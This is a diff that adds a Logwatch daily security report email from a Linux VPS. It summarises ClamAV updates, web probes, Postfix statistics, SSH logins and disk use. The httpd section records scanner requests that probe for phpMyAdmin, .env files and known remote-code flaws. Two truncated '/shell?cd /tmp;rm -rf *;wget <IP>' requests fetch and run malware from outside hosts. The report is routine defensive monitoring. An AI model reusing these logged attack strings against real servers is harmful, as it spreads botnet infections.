@@ -1,0 +1,244 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 5836434292D; Tue, 27 Oct 2020 04:49:14 +0100 (CET)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20201027034914.5836434292D@hrankiety.pl>
+Date: Tue, 27 Oct 2020 04:49:04 +0100 (CET)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Tue Oct 27 04:49:04 2020
+        Date Range Processed: yesterday
+                              ( 2020-Oct-26 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Mon Oct 26 03:20:16 2020
+ 
+ Last Status:
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25968.cdiff [100%]
+    daily.cld updated (version: 25968, sigs: 4335422, f-level: 63, builder: raynman)
+    Can't query daily.25968.93.1.0.6810DB54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (8900418 signatures) from db.local.clamav.net (IP: 104.16.219.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 4 sites probed the server 
+    175.205.61.179
+    185.202.2.147
+    185.217.1.114
+    41.216.186.89
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 1 Time(s)
+       null: 5 Time(s)
+    404 Not Found
+       /.env: 4 Time(s)
+       /GponForm/diag_Form?images/: 1 Time(s)
+       /HNAP1/: 1 Time(s)
+       /PMA/: 1 Time(s)
+       /PMA2005/: 1 Time(s)
+       /SQLite/main.php: 1 Time(s)
+       /SQLiteManager-1.2.4/main.php: 1 Time(s)
+       /SQLiteManager/main.php: 1 Time(s)
+       /SQlite/main.php: 1 Time(s)
+       /admin/: 1 Time(s)
+       /admin//config.php: 3 Time(s)
+       /afterlogic/VERSION: 1 Time(s)
+       /agSearch/SQlite/main.php: 1 Time(s)
+       /ajax: 1 Time(s)
+       /api/jsonws/invoke: 1 Time(s)
+       /cgi-bin/mainfunction.cgi: 1 Time(s)
+       /dbadmin/: 1 Time(s)
+       /hudson: 1 Time(s)
+       /hudson/script: 1 Time(s)
+       /index.php?s=/Index/\\think\\app/invokefun ... ]=HelloThinkPHP: 1 Time(s)
+       /mail/VERSION: 1 Time(s)
+       /main.php: 1 Time(s)
+       /mifs/.;/services/LogService: 1 Time(s)
+       /myadmin/: 1 Time(s)
+       /mysql-admin/: 1 Time(s)
+       /mysql/: 1 Time(s)
+       /mysqladmin/: 1 Time(s)
+       /mysqlmanager/: 1 Time(s)
+       /openserver/phpmyadmin/: 1 Time(s)
+       /p/m/a/: 1 Time(s)
+       /php-my-admin/: 1 Time(s)
+       /php-myadmin/: 1 Time(s)
+       /phpMyAdmin-2.2.3/: 1 Time(s)
+       /phpMyAdmin-2.2.6/: 1 Time(s)
+       /phpMyAdmin-2.5.1/: 1 Time(s)
+       /phpMyAdmin-2.5.4/: 1 Time(s)
+       /phpMyAdmin-2.5.5-pl1/: 1 Time(s)
+       /phpMyAdmin-2.5.5-rc1/: 1 Time(s)
+       /phpMyAdmin-2.5.5-rc2/: 1 Time(s)
+       /phpMyAdmin-2.5.5/: 1 Time(s)
+       /phpMyAdmin-2.5.6-rc1/: 1 Time(s)
+       /phpMyAdmin-2.5.6-rc2/: 1 Time(s)
+       /phpMyAdmin-2.5.6/: 1 Time(s)
+       /phpMyAdmin-2.5.7-pl1/: 1 Time(s)
+       /phpMyAdmin-2.5.7/: 1 Time(s)
+       /phpMyAdmin-2.6.0-alpha/: 1 Time(s)
+       /phpMyAdmin-2.6.0-alpha2/: 1 Time(s)
+       /phpMyAdmin-2.6.0-beta1/: 1 Time(s)
+       /phpMyAdmin-2.6.0-beta2/: 1 Time(s)
+       /phpMyAdmin-2.6.0-pl1/: 1 Time(s)
+       /phpMyAdmin-2.6.0-pl2/: 1 Time(s)
+       /phpMyAdmin-2.6.0-pl3/: 1 Time(s)
+       /phpMyAdmin-2.6.0-rc1/: 1 Time(s)
+       /phpMyAdmin-2.6.0-rc2/: 1 Time(s)
+       /phpMyAdmin-2.6.0-rc3/: 1 Time(s)
+       /phpMyAdmin-2.6.0/: 1 Time(s)
+       /phpMyAdmin-2.6.1-pl1/: 1 Time(s)
+       /phpMyAdmin-2.6.1-pl2/: 1 Time(s)
+       /phpMyAdmin-2.6.1-pl3/: 1 Time(s)
+       /phpMyAdmin-2.6.1-rc1/: 1 Time(s)
+       /phpMyAdmin-2.6.1-rc2/: 1 Time(s)
+       /phpMyAdmin-2.6.1/: 1 Time(s)
+       /phpMyAdmin-2.6.2-beta1/: 1 Time(s)
+       /phpMyAdmin-2.6.2-pl1/: 1 Time(s)
+       /phpMyAdmin-2.6.2-rc1/: 2 Time(s)
+       /phpMyAdmin-2.6.2/: 1 Time(s)
+       /phpMyAdmin-2.6.3-pl1/: 1 Time(s)
+       /phpMyAdmin-2.6.3-rc1/: 1 Time(s)
+       /phpMyAdmin-2.6.3/: 2 Time(s)
+       /phpMyAdmin-2.6.4-pl1/: 1 Time(s)
+       /phpMyAdmin-2.6.4-pl2/: 1 Time(s)
+       /phpMyAdmin-2.6.4-pl3/: 1 Time(s)
+       /phpMyAdmin-2.6.4-pl4/: 1 Time(s)
+       /phpMyAdmin-2.6.4-rc1/: 1 Time(s)
+       /phpMyAdmin-2.6.4/: 1 Time(s)
+       /phpMyAdmin-2.7.0-beta1/: 1 Time(s)
+       /phpMyAdmin-2.7.0-pl1/: 1 Time(s)
+       /phpMyAdmin-2.7.0-pl2/: 1 Time(s)
+       /phpMyAdmin-2.7.0-rc1/: 1 Time(s)
+       /phpMyAdmin-2.7.0/: 1 Time(s)
+       /phpMyAdmin-2.8.0-beta1/: 1 Time(s)
+       /phpMyAdmin-2.8.0-rc1/: 1 Time(s)
+       /phpMyAdmin-2.8.0-rc2/: 1 Time(s)
+       /phpMyAdmin-2.8.0.1/: 1 Time(s)
+       /phpMyAdmin-2.8.0.2/: 1 Time(s)
+       /phpMyAdmin-2.8.0.3/: 1 Time(s)
+       /phpMyAdmin-2.8.0.4/: 1 Time(s)
+       /phpMyAdmin-2.8.0/: 1 Time(s)
+       /phpMyAdmin-2.8.1-rc1/: 1 Time(s)
+       /phpMyAdmin-2.8.1/: 1 Time(s)
+       /phpMyAdmin-2.8.2/: 1 Time(s)
+       /phpMyAdmin-2/: 1 Time(s)
+       /phpMyAdmin/: 1 Time(s)
+       /phpMyAdmin2/: 1 Time(s)
+       /phpmanager/: 1 Time(s)
+       /phpmy-admin/: 1 Time(s)
+       /phpmyadmin/: 1 Time(s)
+       /phpmyadmin2/: 1 Time(s)
+       /pma/: 1 Time(s)
+       /pma2005/: 1 Time(s)
+       /script: 1 Time(s)
+       /setup.cgi?next_file=netgear.cfg&todo=sysc ... ntsetting.htm=1: 1 Time(s)
+       /shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181 ... stMode.Rep.Jaws: 1 Time(s)
+       /shell?cd+/tmp;rm+-rf+*;wget+192.210.239.1 ... stMode.Rep.Jaws: 1 Time(s)
+       /sqlite/main.php: 1 Time(s)
+       /sqlitemanager/main.php: 1 Time(s)
+       /sqlmanager/: 1 Time(s)
+       /sqlweb/: 1 Time(s)
+       /test/sqlite/SQLiteManager-1.2.0/SQLiteMan ... -1.2.0/main.php: 1 Time(s)
+       /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php: 2 Time(s)
+       /webadmin/: 1 Time(s)
+       /webdb/: 1 Time(s)
+       /webmail/VERSION: 1 Time(s)
+       /websql/: 1 Time(s)
+       /wp-content/plugins/wp-file-manager/readme.txt: 1 Time(s)
+       /wp-login.php: 1 Time(s)
+       http://www.msftncsi.com/ncsi.txt: 1 Time(s)
+    408 Request Timeout
+       null: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       93   *Warning: Pre-queue content-filter connection overload 
+    20105   SASL authentication failed 
+      204   Miscellaneous warnings 
+ 
+   11.385K  Bytes accepted                            11,658
+    5.347K  Bytes delivered                            5,475
+ ========   ================================================
+ 
+        3   Accepted                                  60.00%
+        2   Rejected                                  40.00%
+ --------   ------------------------------------------------
+        5   Total                                    100.00%
+ ========   ================================================
+ 
+        2   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        2   Total Rejects                            100.00%
+ ========   ================================================
+ 
+      466   4xx Reject sender address                100.00%
+ --------   ------------------------------------------------
+      466   Total 4xx Rejects                        100.00%
+ ========   ================================================
+ 
+    20583   Connections made      
+        1   Connections lost      
+    20578   Disconnections        
+        3   Removed from queue    
+        1   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+       23   Timeout (inbound)     
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   33G   16G  69% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
